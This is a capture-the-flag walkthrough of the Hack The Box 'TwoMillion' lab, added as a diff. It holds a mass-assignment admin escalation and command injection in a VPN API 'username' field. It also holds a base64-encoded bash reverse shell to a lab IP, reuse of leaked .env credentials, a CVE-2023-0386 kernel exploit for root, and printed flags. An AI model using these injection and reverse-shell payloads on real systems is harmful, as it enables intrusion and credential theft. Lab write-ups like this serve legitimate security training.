@@ -1,0 +1,316 @@
+TwoMillion Lab
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.10.11.221
+
+
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http://2million.htb/ 
+
+echo 10.10.11.221 2million.htb | sudo tee -a /etc/hosts
+http://2million.htb/login 
+
+gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+-Gobuster scan did not work due to redirection response codes
+
+http://2million.htb/login?error=User+not+found 
+-Got this error on the URL when trying to put in fake email and password
+
+HTTP post request:
+POST /api/v1/user/login HTTP/1.1
+Host: 2million.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Origin: http://2million.htb
+Connection: close
+Referer: http://2million.htb/login?error=User+not+found
+Cookie: PHPSESSID=44lqcamoanapi76drspkrduk9o
+Upgrade-Insecure-Requests: 1
+
+email=root&password=admin
+
+Http response:
+HTTP/1.1 302 Found
+Server: nginx
+Date: Thu, 08 Aug 2024 17:37:40 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login?error=User+not+found
+Content-Length: 0
+
+Let’s test an SQL injection by injecting a quotation after admin’ field for password
+	-Didn’t work / no change in HTTP response
+
+
+sqlmap -u "http://2million.htb/api/v1/user/login" --data="email=root&password=admin" --batch --dbs
+
+-Email and password field is not injectable per sqlmap 
+
+
+I went into the developer web console and specified JS files where I found inviteapi.min.js
+
+Response payload of the file, and it seems to be obfuscated:
+ eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
+
+I used ChatGPT to deobfuscate the code:
+function verifyInviteCode(code) {
+    var formData = { "code": code };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+
+curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
+-let’s go check out this API
+
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",                                                                                           
+    "enctype": "ROT13"
+  },
+  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."                                                                                     
+}
+            
+
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",       
+
+Translate to this via the rot13.com 
+
+    "qngn": "In order to generate the invite code, make a POST request to /api/v1/invite/generate",       
+
+curl -sX POST http://2million.htb/api/v1/invite/generate | jq
+
+Response:
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "code": "MkFBMFYtRE1BWDktVzkyTkotRDkwVVM=",
+    "format": "encoded"
+  }
+}
+
+It seems to be encrypted in base64, let’s decipher using base64 decode
+
+echo MkFBMFYtRE1BWDktVzkyTkotRDkwVVM= | base64 -d 
+
+Output: 2AA0V-DMAX9-W92NJ-D90US        
+
+Go to 2million.htb/register and enter in the invite code, it appears to be valid
+
+root@htb.com as email
+With password root and username admin
+
+
+http://2million.htb/home - We got into the homepage
+
+There’s this information:
+Hack The Box
+Dashboard
+1.2.8
+
+HTTP request in order to download a VPN file from the website
+GET /api/v1/user/vpn/generate HTTP/1.1
+Host: 2million.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Referer: http://2million.htb/home/access
+Cookie: PHPSESSID=44lqcamoanapi76drspkrduk9o
+Upgrade-Insecure-Requests: 1
+
+curl -sv 2million.htb/api --cookie "PHPSESSID=44lqcamoanapi76drspkrduk9o" | jq
+
+Output:
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> GET /api HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Cookie: PHPSESSID=44lqcamoanapi76drspkrduk9o
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Thu, 08 Aug 2024 18:05:40 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+{ [47 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "/api/v1": "Version 1 of the API"
+}
+
+Let’s enumerate further and go to v1
+curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=44lqcamoanapi76drspkrduk9o" | jq 
+
+* Connection #0 to host 2million.htb left intact
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+
+
+
+curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
+"PHPSESSID=44lqcamoanapi76drspkrduk9o" | jq
+-This gave us an 200 message
+
+Given further enumeration, we find that updating the admin/settings/update fields needs an email and is_admin defined as we continue to curl
+curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=44lqcamoanapi76drspkrduk9o" --header "Content-Type: application/json" --data
+'{"email":"root@htb.com"}' | jq
+
+Final command:
+curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
+"PHPSESSID=44lqcamoanapi76drspkrduk9o" --header "Content-Type: application/json" --data
+'{"email":"root@htb.com", "is_admin": '1'}' | jq
+
+Output:
+{
+  "id": 21,
+  "username": "admin",
+  "is_admin": 1
+}
+          
+Let's check out the /admin/vpn/generate URL now that we have sufficient permissions
+               
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=44lqcamoanapi76drspkrduk9o" --header "Content-Type: application/json" | jq
+
+Command gives us error we need to give username
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
+"PHPSESSID=44lqcamoanapi76drspkrduk9o" --header "Content-Type: application/json" --data
+'{"username":"test"}'
+
+This was successful request, now we can perform RCE via our test parameter
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
+"PHPSESSID=44lqcamoanapi76drspkrduk9o" --header "Content-Type: application/json" --data
+'{"username":"test;id;"}’
+
+Output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Launch a netcat listener and make this payload
+bash -i >& /dev/tcp/10.10.14.133/1234 0>&1
+
+└─$ echo "bash -i >& /dev/tcp/10.10.14.133/1234 0>&1" | base64 
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzMvMTIzNCAwPiYxCg==
+
+
+
+-Turn the payload into a base64 encoded message to send over as a CURL
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=44lqcamoanapi76drspkrduk9o" --header "Content-Type: application/json" --data
+'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzMvMTIzNCAwPiYxCg==|
+base64 -d | bash;"}'
+
+Once we sent it, we got the reverse shell connection
+
+Privilege escalation:
+
+Enumeration current environment variables
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+ssh admin@10.10.11.221
+
+
+admin@2million:~$ cat user.txt
+9acb452c00ab94b76656850078b231ce
+
+Within the admin’s home directory, we see a directory called “CVE-2023-0386-main”
+
+https://github.com/sxlmnwb/CVE-2023-0386 - We also see this github
+
+Following the commands, we brought the file over via scp and into the tmp directory, where we followed the github’s instructions and got root access
+
+root@2million:/tmp/CVE-2023-0386# id
+uid=0(root) gid=0(root) groups=0(root),1000(admin)
+root@2million:/tmp/CVE-2023-0386# cd /root
+root@2million:/root# ls
+root.txt  snap  thank_you.json
+root@2million:/root# cat root.txt
+7ca14ddd81eab54d3d177fd635e3d7c8
+
